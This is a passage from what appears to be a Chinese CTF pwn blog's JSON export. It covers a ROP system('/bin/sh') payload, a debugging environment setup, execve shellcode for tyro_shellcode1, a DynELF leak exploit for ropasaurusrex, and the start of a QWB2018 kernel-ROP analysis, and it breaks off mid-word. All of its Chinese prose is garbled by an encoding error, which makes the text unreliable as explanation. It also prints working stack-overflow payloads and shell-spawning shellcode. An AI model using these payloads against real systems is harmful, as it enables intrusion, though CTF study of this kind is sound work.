ä¹Ÿæ˜¯0FFã€‚(å®é™…æƒ…å†µgotå’Œpltæ¥å›è°ƒç€ç”¨å‘—ï¼Œå“ªä¸ªå¥½ä½¿ç”¨å“ªä¸ª)\n\n10.é‚£ä¹ˆç°åœ¨æœ‰äº†system_addrå’Œbinsh_addrï¼Œè€Œç¨‹åºåˆæ˜¯ä»æœ€å¼€å§‹è¿è¡Œï¼Œæ‰€ä»¥ç°åœ¨å°è¯•getshellï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = b\"A\"*72 #padding\npayload += p64(pop_rdi) #ç»™systemå‡½æ•°ä¼ å‚\npayload += p64(binsh_addr) #rdi = &(\"/bin/sh\\x00\")\npayload += p64(system_addr) #è°ƒç”¨systemå‡½æ•°æ‰§è¡Œsystem(\"/bin/sh\")\npayload = payload.ljust(200, b\"B\") #paddingï¼Œè·³å‡ºå¾ªç¯\nio.send(payload)\nio.interactive()\n```\n\n11.å¦å¤–ç”±äºåœ¨libcä¸­æŸ¥æ‰¾ä¹Ÿæ¯”è¾ƒç¹çï¼Œæ‰€ä»¥æœ‰ä¸ªlibcSearchå¯ä»¥ç®€åŒ–ä½¿ç”¨ï¼Œå…·ä½“æŸ¥èµ„æ–™å§ã€‚\n\n \n\nâ–²\n\n1.å¾€putså‡½æ•°ä¸­ä¼ å…¥å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼ˆelf.gotï¼‰å‚æ•°å¯ä»¥æ‰“å°å‡ºè¢«åŠ è½½åœ¨Libcä¸­çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n2.ç”¨è¦†ç›–è¿”å›åœ°å€retçš„å½¢å¼è°ƒç”¨å‡½æ•°éœ€è¦ç”¨å‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ï¼Œï¼ˆelf.pltï¼‰è¿™æ˜¯åº“å‡½æ•°åœ°å€ï¼Œéœ€è¦å…ˆåˆ°pltä¸­ï¼Œç„¶åå†åˆ°gotè¡¨ä¸­ï¼Œè¿™æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ã€‚\n\n3.ä½†å¦‚æœåœ¨gadgetä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡ç»™r12èµ‹å€¼æ¥è°ƒç”¨elf.gotè¡¨ä¸­çš„å‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯call qword ptr[r12+rbx*8]ï¼ŒæŒ‡å‘çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çœŸå®åœ°å€ï¼Œéœ€è¦çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ã€‚å¦‚æœåªæ˜¯call addrï¼Œåˆ™åº”è¯¥æ˜¯callå‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ã€‚\n\n4.ä¸‡èƒ½gadgetä¸€èˆ¬åœ¨_libc_csu_initä¸­ï¼Œæˆ–è€…initæˆ–è€…ç›´æ¥ROPgadgetæŸ¥ä¹Ÿå¯ä»¥\n\n \n\nâ–²movå’ŒleaåŒºåˆ«ï¼š\n\nmov:å¯¹äºå˜é‡ï¼ŒåŠ ä¸åŠ []éƒ½è¡¨ç¤ºå–å€¼ï¼›å¯¹äºå¯„å­˜å™¨è€Œè¨€ï¼Œæ— []è¡¨ç¤ºå–å€¼ï¼Œæœ‰[]è¡¨ç¤ºå–åœ°å€ã€‚\n\nlea:å¯¹äºå˜é‡ï¼Œå…¶åé¢çš„æœ‰æ— []çš†å¯ï¼Œéƒ½è¡¨ç¤ºå–å˜é‡åœ°å€ï¼Œç›¸å½“äºæŒ‡é’ˆã€‚å¯¹äºå¯„å­˜å™¨è€Œè¨€ï¼Œæ— []è¡¨ç¤ºå–åœ°å€ï¼Œæœ‰[]è¡¨ç¤ºå–å€¼ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"Learn_malloc.c_before","url":"/2021/08/14/Learn_malloc.c_before/","content":"\nä¸€ã€ç¯å¢ƒéƒ¨ç½²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndocker pull ubuntu:16.04\ndocker pull ubuntu:18.04\ndocker pull ubuntu:20.04\n```\n\näºŒã€ç¯å¢ƒå®‰è£…:\n\n1.aptæ¢æºï¼Œdockeræ¢æºï¼Œpipæ¢æºã€‚\n\n2.å®‰è£…å‰ç½®åŒ…ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo apt-get install libxml2-dev\nsudo apt-get install libxslt-dev\nsudo apt-get install libmysqlclient-dev\nsudo apt-get install libsqlite3-dev\nsudo apt-get install zlib1g-dev\nsudo apt-get install python-dev\nsudo apt-get install libffi-dev\nsudo apt-get install libssl-dev\n```\n\n3.å®‰è£…pythonå¥½å¤šæ­¥éƒ¨æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwget https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz\n(wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz)\ntar -zxvf Python-2.7.9.tgz\ncd Python-2.7.9\n./configure --prefix=/usr/local/python27\nmake\nmake install\nln -s /usr/local/python27/bin/python /usr/bin/python2\n```\n\n4.å®‰è£…setuptoolså››éƒ¨æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip#md5=74663b15117d9a2cc5295d76011e6fd1\nunzip setuptools-36.6.0.zip\ncd setuptools-36.6.0\npython2 setup.py install\n```\n\n5.å®‰è£…pipå››éƒ¨æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwget https://pypi.python.org/packages/11/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-9.0.1.tar.gz#md5=35f01da33009719497f01a4ba69d63c9\ntar -zxvf pip-9.0.1.tar.gz\ncd pip-9.0.1\npython2 setup.py install\nln -s /usr/local/python27/bin/pip2.7 /usr/bin/pip2\n```\n\n6.å®‰è£…pwndbgä¸‰éƒ¨æ›²:\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n```\n\n7.æ·»åŠ pwngdb:\n\n```\n#æ³¨é‡Šå¤´\n\ncd ~\ngit clone https://github.com/0xKira/pwngdb.git\nvim ~/.gdbinit\n#å°†pedaæ³¨é‡Šï¼Œæ·»åŠ ï¼š(å¿…é¡»åŠ åœ¨ç¬¬ä¸€è¡Œ)\nsource ~/pwndbg/gdbinit.py\n```\n\n8.å®‰è£…pwntoolsä¸€æ­¥æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npip2 install pwntools\npip3 install pwntools\n```\n\nä¸‰ã€å‡†å¤‡æºç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nhttp://ftp.gnu.org/gnu/glibc/\n```\n\næŒ‚é£æœºä¸‹gzåŒ…è€å¿«äº†ï¼Œæ‰¾åˆ°é‡Œé¢çš„malloc.cå‡†å¤‡å¼€å§‹é˜…è¯»ã€‚\n\nå››ã€è·Ÿç€CTFwikiä¸€æ­¥æ­¥è°ƒè¯•ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/\n\näº”ã€è§†é¢‘è°ƒè¯•ï¼š\n\nhttps://www.bilibili.com/video/BV1q5411h7Wf\n\n \n\n \n\n \n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN"]},{"title":"Openctf 2016-tyro_shellcode1","url":"/2021/08/14/Openctf 2016-tyro_shellcode1/","content":"\n \n\n1.å¸¸è§„checksecï¼Œå¼€äº†Canaryå’ŒNXï¼ŒIDAæŸ¥æ‰¾æ¼æ´ï¼Œæ‰¾åˆ°ä¸‹åˆ—å¥‡æ€ªä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nv4 = mmap(0, 0x80u, 7, 34, -1, 0);\n-----------------------------------------------------------------------------\nread(0, v4, 0x20u);\nv5 = ((int (*)(void))v4)();\n```\n\nå¯ä»¥çŒœå‡ºæ¥æ˜¯è¾“å…¥åˆ°v4ä¸­ï¼Œç„¶åv4è¢«å¼ºåˆ¶è½¬æ¢æˆå‡½æ•°æŒ‡é’ˆè¢«è°ƒç”¨ã€‚æŸ¥çœ‹æ±‡ç¼–ä»£ç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191554098.jpeg)\n\nè¿™é‡Œå°±æ²¡åŠæ³•åˆ¤æ–­åˆ°åº•[esp+34h]æ˜¯ä¸æ˜¯v4äº†ï¼Œå› ä¸ºv4æ˜¯é€šè¿‡mmapç”³è¯·çš„ä¸€å—å†…å­˜ï¼Œè™½ç„¶åœ¨æ ˆä¸Šï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“åœ¨å“ªï¼Œéœ€è¦é€šè¿‡è°ƒè¯•æ‰èƒ½çŸ¥é“ï¼Œè°ƒè¯•ä¹‹åå‘ç°ç¡®å®æ˜¯è¿™æ ·ã€‚\n\n2.è™½ç„¶æœ€å¼€å§‹checksecç¨‹åºï¼Œå‘ç°å¼€äº†NXï¼Œé‚£ä¹ˆè¿™ä¸å°±ä»£è¡¨æ²¡åŠæ³•shellcodeäº†å—ã€‚è°ƒè¯•ä¹Ÿå‘ç°ï¼Œé™¤äº†ä»£ç æ®µï¼Œå…¶å®ƒæ®µéƒ½æ²¡æœ‰Xå±æ€§ï¼Œéƒ½ä¸å¯æ‰§è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹æ±‡ç¼–ä»£ç ï¼Œæ˜¯call eaxï¼Œè°ƒç”¨çš„æ˜¯å¯„å­˜å™¨ï¼Œä¸æ˜¯ç¨‹åºæ®µï¼Œä¸€å®šå¯ä»¥è¢«è°ƒç”¨çš„ï¼Œç„¶åeaxä¸­ä¿å­˜çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å•Šï¼Œæ‰€ä»¥ç›´æ¥è¾“å…¥shellcodeå°±å®Œäº‹ï¼Œè¿æ ˆæº¢å‡ºä»€ä¹ˆçš„éƒ½ä¸ç”¨è€ƒè™‘ã€‚\n\n3.é‚£ä¹ˆç›´æ¥ä»http://shell-storm.org/shellcode/\n\næŸ¥æ‰¾è·å–å°±å¯ä»¥ã€‚ç»™å‡ºä¸€æ®µå¯ç”¨shellcode:\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n\n \n\nç”±äºè¿™æ®µshellcodeè°ƒç”¨çš„æ˜¯int80æ¥è·å–shellçš„ï¼Œæ‰€ä»¥ç»™å‡ºä¸‹åˆ—ä»‹ç»\n\nâ–²int 80hï¼š128å·ä¸­æ–­\n\n1.åœ¨32ä½Linuxä¸­è¯¥ä¸­æ–­è¢«ç”¨äºå‘¼å«ç³»ç»Ÿè°ƒç”¨ç¨‹åºsystem_call()ã€‚\n\n2.read(), write(), system()ä¹‹ç±»çš„éœ€è¦å†…æ ¸â€œå¸®å¿™â€çš„å‡½æ•°ï¼Œå°±æ˜¯å›´ç»•è¿™æ¡æŒ‡ä»¤åŠ ä¸Šä¸€äº›é¢å¤–å‚æ•°å¤„ç†ï¼Œå¼‚å¸¸å¤„ç†ç­‰ä»£ç å°è£…è€Œæˆçš„ã€‚32ä½linuxç³»ç»Ÿçš„å†…æ ¸ä¸€å…±æä¾›äº†0~337å·å…±è®¡338ç§ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥å®ç°ä¸åŒçš„åŠŸèƒ½ã€‚\n\n3.è¾“å…¥çš„shellcodeä¹Ÿå°±æ±‡ç¼–æˆäº†EAX = 0Xb = 11ï¼ŒEBX = &(â€œ/bin//shâ€), ECX = EDX = 0ï¼Œç­‰åŒäºæ‰§è¡Œä»£ç sys_execve(\"/bin//sh\", 0, 0, 0)ï¼Œé€šè¿‡/bin/shè½¯é“¾æ¥æ‰“å¼€ä¸€ä¸ªshellã€‚è¿™é‡Œsys_execveè°ƒç”¨çš„å‚æ•°å°±æ˜¯ebxçš„å¯¹åº”çš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ²¡æœ‰systemå‡½æ•°çš„æƒ…å†µä¸‹æ‰“å¼€shellã€‚64ä½linuxç³»ç»Ÿçš„æ±‡ç¼–æŒ‡ä»¤å°±æ˜¯syscallï¼Œè°ƒç”¨sys_execveéœ€è¦å°†EAXè®¾ç½®ä¸º0x3Bï¼Œæ”¾ç½®å‚æ•°çš„å¯„å­˜å™¨ä¹Ÿå’Œ32ä½ä¸åŒ\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"PlaidCTF 2013 ropasaurusrex","url":"/2021/08/14/PlaidCTF 2013 ropasaurusrex/","content":"\n1.å¸¸è§„checksecï¼Œåªå¼€å¯äº†ä¸€ä¸ªNXï¼Œä¸èƒ½ä½¿ç”¨shellcodeï¼ŒIDAåˆ†ææ¼æ´ï¼Œç¨‹åºçš„sub_80483F4()å‡½æ•°æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [esp+10h] [ebp-88h]\n------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\næœ‰writeå‡½æ•°ï¼Œæ²¡æœ‰libcï¼Œgotè¡¨é‡Œæ²¡æœ‰systemï¼Œä¹Ÿæ²¡æœ‰int 80h/syscallï¼Œæ²¡æœ‰binshå­—ç¬¦ä¸²ã€‚\n\n2.è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨DynELFæ¥leaklibcï¼Œè¿›è€Œè·å–systemå‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå°±å¯ä»¥å†ç”¨readå‡½æ•°æ¥è¯»å–å­—ç¬¦ä¸²ã€‚\n\n3.é¦–å…ˆç¼–å†™leakå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯éœ€è¦è°ƒç”¨writeå‡½æ•°æ‰“å°éœ€è¦æ³„éœ²çš„åœ°å€\n\nå¸¸è§„çš„leakå‡½æ•°æ¨¡å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #è°ƒç”¨write\n    payload += p32(start_addr) #writeè¿”å›åˆ°start\n    payload += p32(1) #writeç¬¬ä¸€ä¸ªå‚æ•°fd\n    payload += p32(addr) #writeç¬¬äºŒä¸ªå‚æ•°buf\n    payload += p32(8) #writeç¬¬ä¸‰ä¸ªå‚æ•°size\n    io.sendline(payload)\n    content = io.recv()[:8] #æ¥å—å†…å®¹è¯»å–é€šè¿‡writeæ‰“å°çš„åœ°å€\n    print(\"%#x -> %s\" %(addr, (content or '').encode('hex')))\n    #è¿™é‡Œæ‰“å°ä¸éœ€è¦ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯å¯ä»¥æ‰“å°å‡ºæ¥è®©æˆ‘ä»¬çœ‹åˆ°writeæ‰“å°äº†ä»€ä¹ˆåœ°å€ï¼ŒåŸºæœ¬éƒ½æ‰“å°äº†\n    return content\n    #è¿™é‡Œreturnçš„contenæœ‰å¾ˆå¤šåœ°å€ï¼Œéœ€è¦é€šè¿‡ä¹‹åçš„DynELFæ¥lookupå¯¹åº”çš„åœ°å€\n```\n\nè¿™é‡Œçš„writeå‡½æ•°å¯ä»¥æ¢æˆputæˆ–è€…printfå‡½æ•°ï¼Œä½†æ˜¯å¦‚æœæ”¹å˜äº†ï¼Œé‚£ä¹ˆåé¢çš„å‚æ•°ä¸ªæ•°ä¹Ÿéœ€è¦å‘ç”Ÿæ”¹å˜ï¼Œå¯¹åº”æ‰“å°å‡½æ•°çš„å½¢å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nssize_t write(int fd,const void *buf,size_t count);\nint puts(const char *s)\nint printf(const char*format, ......)ï¼›\n```\n\nå…·ä½“è¯·å‚è€ƒï¼š\n\nhttps://www.anquanke.com/post/id/85129\n\n4.æ¥ä¸‹æ¥å°±éœ€è¦åˆ›å»ºDynELFç±»æ¥ä½¿ç”¨\n\n```\n#æ³¨é‡Šå¤´\n\nd = DynELF(leak, elf = elf)\n#åˆ›å»ºDynELFç±»ï¼Œä¼ å…¥éœ€è¦æ³„éœ²çš„åœ°å€ï¼Œä»elfæ–‡ä»¶ä¸­è·å–\nsystem_addr = d.lookup('system', 'libc')\n```\n\n5.æ‰¾åˆ°system_addrä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡å†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ¥è¯»å–å­—ç¬¦ä¸²ï¼Œå› ä¸ºä¹‹å‰writeçš„è¿”å›åœ°å€å·²ç»æ˜¯æœ€å¼€å§‹çš„startåœ°å€ã€‚å†æ¬¡è¿è¡Œåˆ°readå‡½æ•°è¯»å–ç¬¬äºŒæ¬¡çš„payloadï¼Œç»„æˆä¸ºï¼š\n\n```\n#æ³¨é‡Š\n\npayload = padding\npayload += read_addr #è¦†ç›–eipï¼Œå°†sub_80483F4å‡½æ•°çš„è¿”å›åœ°å€åŠ«æŒåˆ°readå‡½æ•°)\npayload += system_addr #ä½¿å¾—readå‡½æ•°çš„è¿”å›åœ°å€ä¸ºsystem)\npayload += p32(fd) #readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒæ—¶ä¹Ÿå¯¹åº”systemå‡½æ•°çš„è¿”å›åœ°å€\npayload += p32(binsh_addr) #readå‡½æ•°è¯»å–è¿›binshçš„åœ°å€ï¼ŒåŒæ—¶ä¹Ÿå¯¹åº”systemå‡½æ•°çš„å‚æ•°\npayload += p32(size) #readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¯»å–çš„å­—ç¬¦ä¸²å¤§å°ï¼Œäºsystemå‡½æ•°æ— å®é™…æ„ä¹‰ï¼Œä½†æ˜¯å¦‚æœsystemå‡½æ•°è¿”å›äº†ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯è¿”å›ä¹‹åçš„eipï¼Œä¸‹ä¸€æ¡æ‰§è¡Œçš„ä»£ç åœ°å€ã€‚\n```\n\n6.ç¨‹åºæ€»æµç¨‹å¦‚ä¸‹ï¼š\n\nç”±äºç¬¬ä¸€æ®µPayloadæœ€åwriteè°ƒç”¨åè¿”å›åˆ°äº†startï¼Œæ‰€ä»¥åˆè°ƒç”¨sub_80483F4å‡½æ•°ï¼Œè¿›å…¥è¯»å–ç•Œé¢ï¼Œéœ€è¦è¾“å…¥ç¬¬äºŒæ®µpayloadæ ˆæº¢å‡ºï¼ŒåŠ«æŒsub_80483F4å‡½æ•°çš„è¿”å›åœ°å€eipä¸ºreadå‡½æ•°åœ°å€ï¼Œä»è€Œè¿›å…¥readå‡½æ•°ã€‚ä¹‹åå†æ¬¡åŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€ä¸ºsystemå‡½æ•°ï¼Œå¹¶ä¸”å°†readçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯»å–è¿›çš„binshå­—ç¬¦ä¸²ä¹Ÿä¼ å…¥systemå‡½æ•°ï¼Œä»è€Œgetshellã€‚\n\n \n\n \n\nâ–²call _readå‡½æ•°å’Œç›´æ¥è°ƒç”¨read_pltçš„åŒºåˆ«ï¼š\n\n1.call _readå‡½æ•°ä¼špush eipï¼Œä¼šä½¿å¾—æ ˆä¸­ç»“æ„ä»æˆ‘ä»¬åŸæœ¬è®¾ç½®å¥½çš„ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npadding\n(call read_addr)_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\nå˜æˆ:\n\n```\n#æ³¨é‡Šå¤´\n\npadding\n(call read_addr)_addr\n(call read_addr)_addrä¸‹ä¸€æ¡æŒ‡ä»¤\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\nè¿™ä¸ªeipæ²¡åŠæ³•æ”¹å˜ï¼Œå› ä¸ºæ˜¯callè¿™ä¸ªæŒ‡ä»¤å¸¦æ¥çš„ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´åœ¨readå‡½æ•°æ²¡åŠæ³•æ­£å¸¸è¯»å–å‚æ•°ï¼Œå¦‚æœå»æ‰system_addrï¼Œåˆä¼šå¯¼è‡´è¿”å›åˆ°callæŒ‡ä»¤ä¸‹ä¸€æ¡leaveè¦æ‰§è¡Œæ—¶ï¼Œebpä¼šæŒ‡å‘ä¸€ä¸ªpaddingï¼Œè¿™æ˜¯åœ¨readå‡½æ•°ä¸­å˜æˆçš„ï¼Œä»è€Œå¯¼è‡´leaveæŒ‡ä»¤ä¹Ÿå‡ºé”™ã€‚\n\n2.ä½†æ˜¯å¦‚æœç›´æ¥è°ƒç”¨read_pltï¼Œæ ˆä¸­ç»“æ„ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npadding\nread_plt_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\nè¿™æ ·Readå‡½æ•°è¯»å–å®Œä¹‹åï¼Œè¿”å›æ—¶å°±ä¼šç›´æ¥è°ƒç”¨system_addrï¼Œå®Œå…¨ä¸ç”¨ç®¡ebpå˜æˆäº†ä»€ä¹ˆï¼ŒåŒæ—¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥å°†binsh_addrä¼ ç»™systemï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Dynelf"],"categories":["PWN","Dynelf0x5"]},{"title":"QWB2018-core","url":"/2021/08/14/QWB2018-core/","content":"\nä¸€ã€ä½¿ç”¨Kernel_ROP\n\n1.é¦–å…ˆè§£åŒ…ï¼ŒæŸ¥çœ‹initè®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#!/bin/sh\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs none /dev\n/sbin/mdev -s\nmkdir -p /dev/pts\nmount -vt devpts -o gid=4,mode=620 none /dev/pts\nchmod 666 /dev/ptmx\ncat /proc/kallsyms > /tmp/kallsyms\necho 1 > /proc/sys/kernel/kptr_restrict\necho 1 > /proc/sys/kernel/dmesg_restrict\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2\ninsmod /core.ko\n\npoweroff -d 120 -f &\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\necho 'sh end!\\n'\numount /proc\numount /sys\n\npoweroff -d 0 -f\n```\n\næ³¨æ„ä¸‰ä¸ªåœ°æ–¹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\necho 1 > /proc/sys/kernel/kptr_restrict\ncat /proc/kallsyms > /tmp/kallsyms ------------------------------------------------------------ \ninsmod /core.ko \n------------------------------------------------------------- \nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n```\n\n(1)æŠŠ/proc/kallsysmæ‹·è´åˆ°tmpæ–‡ä»¶å¤¹ä¸‹ä¸€ä»½ï¼Œè€Œkallsysmä¸­ä¿å­˜äº†åŠ è½½å†…æ ¸ä¹‹åå‡ ä¹æ‰€æœ‰çš„å‡½æ•°è°ƒç”¨ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508732.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508526.jpeg)\n\nç”±äºè¢«kptr_restrictè®¾ä¸º 1ï¼Œè¿™æ ·å°±ä¸èƒ½é€šè¿‡ /proc/kallsymsæŸ¥çœ‹å‡½æ•°åœ°å€äº†ï¼Œä½†æ˜¯è¿™é‡ŒæŠŠkallsysmæ‹·è´åˆ°äº†tmpæ–‡ä»¶å¤¹ä¸‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»tmpæ–‡ä»¶å¤¹ä¸‹çš„kallsysmæ‰¾åˆ°æ‰€æœ‰éœ€è¦çš„åœ°å€ï¼ŒåŒ…æ‹¬gadgetã€‚\n\n(2)insmod /core.koï¼ŒæŒ‚è½½äº†ç›®å½•ä¸‹çš„core.koé©±åŠ¨ç¨‹åºï¼Œé€šå¸¸è¿™ä¸ªé©±åŠ¨ç¨‹åºå°±æ˜¯æ¼æ´çš„æ‰€åœ¨ç‚¹ï¼Œç”¨IDAæ‰“å¼€åˆ†æã€‚\n\n(3)setsid /bin/cttyhack setuidgid 1000 /bin/shï¼Œè¿™ä¸ªå°±æ˜¯è®¾ç½®ç”¨æˆ·æƒé™äº†ï¼Œ1000ä¸ºæƒé™IDï¼Œå¦‚æœè®¾ç½®ä¸º0å°±æ˜¯rootæƒé™äº†ï¼Œä¸ºäº†è°ƒè¯•ï¼Œå¯ä»¥å…ˆè®¾ç½®æˆ0æ–¹ä¾¿ç‚¹ã€‚\n\n2.å†çœ‹ä¸‹start.shå¯åŠ¨qemuçš„è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./core.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\nå¯ä»¥çœ‹åˆ°åŠ è½½äº†core.koé©±åŠ¨ï¼Œå¹¶ä¸”å¼€å¯äº†kaslrã€‚\n\n3.ç„¶ååˆ†æä¸‹core.koä»£ç ï¼Œæ¼æ´ç‚¹åœ¨core_copy_funcå‡½æ•°å’Œcore_writeå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#core_writeå‡½æ•°ï¼š\nif ( v3 <= 0x800 && !copy_from_user(&name, a2, v3) )\n\n\n#core_copy_funcå‡½æ•°ï¼š\n__int64 v2; // [rsp+0h] [rbp-50h]\n-------------------------------------------------------\nif ( a1 > 63 )\n{\n   printk(&unk_2A1);\n   result = 0xFFFFFFFFLL;\n}\nelse\n{\n    qmemcpy(&v2, &name, (unsigned __int16)a1);\n}\n```\n\n(1)nameæ˜¯å…¨å±€å˜é‡ï¼Œcore_writeå‡½æ•°ä»ç”¨æˆ·ç©ºé—´æ‹·è´äº†v3é•¿åº¦åˆ°nameä¸­ï¼Œè€Œcore_writeå‡½æ•°å¯ä»¥é€šè¿‡expä¸­è°ƒç”¨writeï¼Œwrite(core_fd, data, 0x800);æ‰“å¼€è¯¥é©±åŠ¨ä»è€Œè°ƒç”¨é©±åŠ¨ä¸­çš„core_writeå‡½æ•°ï¼Œå°†æˆ‘ä»¬çš„dataå†™å…¥åˆ°nameä¸­ã€‚\n\n(2)ä¹‹åç”±äºcore_copy_funcå‡½æ•°å¯ä»¥é€šè¿‡ioctlå‡½æ•°ç›´æ¥ä¼ å‚è°ƒç”¨ï¼Œæ‰€ä»¥å…¶ä¸­çš„a1å—åˆ°æˆ‘ä»¬æ§åˆ¶ï¼Œç„¶åå¯¹a1çš„æ£€æŸ¥åˆåªæœ‰ä¸€ä¸ªif(a1>63)ï¼Œå­˜åœ¨æ•´æ•°è½¬æ¢çš„æ¼æ´ï¼Œä¹Ÿå°±æ˜¯å¦‚æœa1ä¸ºè´Ÿæ•°ï¼Œå°±èƒ½å¤Ÿé€šè¿‡ifè¯­å¥ï¼Œé‚£ä¹ˆé€šè¿‡qmemcpy(&v2, &name, (unsigned __int16)a1);å‡½æ•°çš„éšå½¢è½¬æ¢ï¼Œå°±å¯ä»¥ä»nameæ‹·è´å¾ˆå¤§çš„æ•°æ®åˆ°v2ä¸Šï¼Œè€Œv2åœ¨å†…æ ¸æ ˆä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹å†…æ ¸æ ˆè¿›è¡Œæ ˆæº¢å‡ºã€‚\n\n4.å¯ä»¥æ„é€ ropé“¾å°è¯•äº†ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªcanaryï¼ŒLeakæ¼æ´åœ¨core_readå’Œioctlå‡½æ•°ä¸Šï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#core_readå‡½æ•°ï¼š\n__int64 v5;\n--------------------------------------------------------\nresult = copy_to_user(v1, (char *)&v5 + off, 64LL);\n\n#ioctlå‡½æ•°ï¼š\ncase 0x6677889C:\n    printk(&unk_2CD);\n    off = v3;\n    break;\n```\n\noffæ˜¯å…¨å±€å˜é‡ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ioctlå‡½æ•°æ¥è®¾ç½®ã€‚v5æ˜¯core_readå†…æ ¸å‡½æ•°æ ˆä¸Šçš„å˜é‡ï¼Œå¯ä»¥ä½¿å¾—offé€‚å½“å¤§ä¸€äº›ï¼Œä»è€Œæ³„éœ²å‡ºcanaryã€‚\n\n5.ç°åœ¨å°è¯•æ„é€ expï¼š\n\n(1)é¦–å…ˆæ‰¾åœ°å€ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n//æ‰¾åˆ°å†…æ ¸åŠ 